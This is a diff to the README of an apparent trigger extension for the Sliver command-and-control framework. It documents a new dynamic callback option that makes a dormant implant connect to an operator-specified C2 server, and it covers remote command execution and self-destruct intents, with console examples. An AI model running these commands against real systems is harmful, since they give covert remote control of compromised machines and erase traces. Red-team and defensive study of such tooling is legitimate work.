@@ -55,6 +55,18 @@ sliver > triggers
 sliver > trigger send 1 wake --comms wg
 ```
 
+Wake with a **dynamic callback address** (the implant connects to the specified C2 instead of its baked-in list):
+
+```
+sliver > trigger send 1 wake --callback mtls://10.0.0.5:8888
+
+[*] Resolved trigger index 1: name=jumpbox-impl target=10.0.0.42 port=46290
+[*] Sending trigger packet: target=10.0.0.42:46290 intent=wake client-id=operator-jc
+[*] Dynamic callback: mtls://10.0.0.5:8888
+[*] Trigger packet sent to 10.0.0.42:46290 (intent=wake)
+[*] Note: UDP is fire-and-forget -- delivery is not confirmed.
+```
+
 Dispatch a server-side task (no UDP, no HMAC -- handler runs in-process):
 
 ```
@@ -134,11 +146,13 @@ The bind-config approach means a crafted `client_id` can't redirect the shell to
 | `trigger ...` | Start a server-side trigger listener with task bindings |
 | `trigger tasks <job-id>` | Print the bindings registered against a running listener |
 | `trigger dispatch <job-id> <task-name>` | Dispatch a server-side task handler (no UDP, runs in-process) |
-| `trigger send <target-ip\|index> <intent>` | Send a signed UDP packet to an implant (wake, self-destruct, exec) |
+| `trigger send <target-ip\|index> <intent>` | Send a signed UDP packet to an implant (wake, self-destruct, exec). Use `--callback` for dynamic C2. |
 | `jobs` | Lists all jobs including trigger listeners |
 | `jobs --kill <id>` | Stop a trigger listener (reuses Sliver's generic job kill) |
 
 # Configuration
+
+## Listener flags
 
 | Flag | Meaning |
 |---|---|
@@ -149,11 +163,24 @@ The bind-config approach means a crafted `client_id` can't redirect the shell to
 | `--allowed-source` | Repeatable; exact IP or CIDR (v4/v6). Empty = any source. |
 | `--allowed-client` | Repeatable; client_id allowlist. Empty = any signed client. |
 
+## Send flags (`trigger send`)
+
+| Flag | Meaning |
+|---|---|
+| `--port` / `-p` | UDP port the implant's triggerwake is bound to (default 46290) |
+| `--secret-env` / `-S` | env var holding the HMAC shared secret (preferred; no secret in argv) |
+| `--secret` | HMAC shared secret (direct value; visible in ps -- prefer `--secret-env`) |
+| `--client-id` | Sender identity included in the trigger packet (default `sliver-operator`) |
+| `--payload` | Command/data for bidirectional intents (e.g., `ls -la /tmp` for `exec`) |
+| `--callback` / `-c` | Dynamic callback address for wake intent (e.g., `mtls://10.0.0.5:8888`). Overrides baked-in C2 list. |
+| `--output` / `-o` | Write exec output to file (only for `intent=exec`) |
+| `--comms` | Preferred C2 transport hint for wake intent (e.g., `mtls`, `wg`) |
+
 # Implant-side wake + self-destruct
 
 When an implant is built with `IncludeTriggerWake=true` in its config (always true for `generate trigger`), it runs a **passive UDP listener** before any C2 traffic. The implant blocks on the wake channel until an operator explicitly wakes it -- zero network traffic until then. Three hardcoded intents:
 
-- `wake` -- unblocks the C2 channel so the implant establishes an **interactive session** (not a beacon). On initial startup this is the first C2 dial-home; on subsequent wakes it re-establishes the session.
+- `wake` -- unblocks the C2 channel so the implant establishes an **interactive session** (not a beacon). On initial startup this is the first C2 dial-home; on subsequent wakes it re-establishes the session. Supports an optional **dynamic callback address** (see below).
 - `self-destruct` -- fires the implant's burn primitive (self-deletes the binary, wipes the operator-configured persistence artifacts, exits).
 - `exec` -- **bidirectional**: executes a command on the implant and sends the output back to the operator over UDP. The command is specified in the `--payload` flag. Output is capped at ~7KB and the exec timeout is 30 seconds. The response is HMAC-signed with the same shared secret.
 
@@ -161,6 +188,37 @@ When an implant is built with `IncludeTriggerWake=true` in its config (always tr
 - `--mtls` -- TCP callback via mTLS. Reliable, works through most NAT/firewalls.
 - `--wg` -- UDP callback via WireGuard. Lower overhead.
 - Recommended: specify **both** `--mtls` and `--wg` for maximum flexibility.
+
+## Dynamic callback address
+
+By default, a woken implant connects back to the C2 addresses baked in at build time. The `--callback` flag on `trigger send` overrides this with a **dynamic callback address**, allowing the operator to specify where the implant should connect at wake time.
+
+```
+sliver > trigger send 1 wake --callback mtls://newc2.example.com:8888
+sliver > trigger send 10.0.0.5 wake --callback wg://vpn.example.com:51820 --secret-env TRIGGER_SECRET
+```
+
+This is designed for **dynamic infrastructure** -- rotating C2 servers, ephemeral redirectors, or situations where the operator doesn't know the callback address at implant build time. The callback URL is a full C2 address in the format `scheme://host:port` where the scheme matches a transport the implant was built with (`mtls`, `wg`, `http`, `https`, `dns`).
+
+**How it works:**
+
+1. The operator passes `--callback mtls://10.0.0.5:8888` on the `trigger send` command.
+2. The callback URL is placed in the trigger packet's `payload` field, which is covered by the HMAC signature.
+3. The implant receives the authenticated packet, parses the URL, extracts the scheme as a transport hint.
+4. Instead of iterating its baked-in C2 list, the implant passes the callback URL as a **temporary C2 override** to its connection loop.
+5. The implant connects to the dynamic address using the specified transport.
+
+If the dynamic target is unreachable, the implant returns to dormant state and waits for the next wake trigger. It does **not** fall through to the baked-in C2 list within the same wake cycle -- each wake is a clean, independent attempt.
+
+**Backward compatibility:** The payload format is backward compatible. Existing wake packets with just a transport hint (e.g., `--comms mtls`) or empty payloads continue to work unchanged. The implant distinguishes a full callback URL from a plain transport hint by the presence of `://` in the payload.
+
+| Payload value | Behavior |
+|---|---|
+| _(empty)_ | Use baked-in C2 list, try all transports |
+| `mtls` | Use baked-in C2 list, prefer mTLS transport |
+| `mtls://10.0.0.5:8888` | Connect to `10.0.0.5:8888` via mTLS (dynamic callback) |
+
+**Security:** The callback URL rides in the `payload` field which is included in the HMAC-SHA256 signature. An attacker without the shared secret cannot forge a packet with a malicious callback address. This is a deliberate design choice -- the authenticated nature of the trigger packet makes it safe to trust the callback target specified within it.
 
 Example:
 
@@ -203,6 +261,7 @@ Configurable per build via `--ttl <duration>` (minimum 1 minute). Example: `--tt
 |---|---|
 | Message integrity | HMAC-SHA256 over canonical JSON, `hmac.Equal` (constant time) |
 | Sender identity | Per-client key registry (`--allowed-client` + future per-client secrets) |
+| Dynamic callback auth | Callback URL rides in the `payload` field, covered by the HMAC signature. Cannot be forged without the shared secret. |
 | Replay defense | TTL'd nonce cache, bounded; over-cap inserts refuse rather than silently evict |
 | Source allowlist | Exact IPs + CIDR ranges, v4 + v6 |
 | Pre-HMAC DoS | Global packets-per-second cap (source-IP-agnostic; UDP source is forgeable) |
@@ -219,5 +278,15 @@ Configurable per build via `--ttl <duration>` (minimum 1 minute). Example: `--tt
 # Wire protocol
 
 JSON over UDP. Canonical signable payload uses Go's deterministic alphabetical key order so cross-language ports (Python, Rust) produce byte-identical HMAC inputs. Version pinned at `1`; any wire change MUST bump the version and break verifying receivers.
+
+The `payload` field is a free-form string included in the HMAC computation when non-empty. Its semantics depend on the intent:
+
+| Intent | Payload semantics |
+|---|---|
+| `wake` | Empty (no preference), transport hint (`mtls`), or full callback URL (`mtls://host:port`) |
+| `exec` | The command to execute (e.g., `ls -la /tmp`) |
+| `self-destruct` | Unused (ignored) |
+
+The wake payload format is backward compatible -- the implant uses `://` detection to distinguish a dynamic callback URL from a plain transport hint.
 
 The standalone repo (`github.com/0x90pkt/trigger`) carries locked wire-compat regression vectors (`pkg/protocol/vectors_test.go`) -- those are the reference contract.
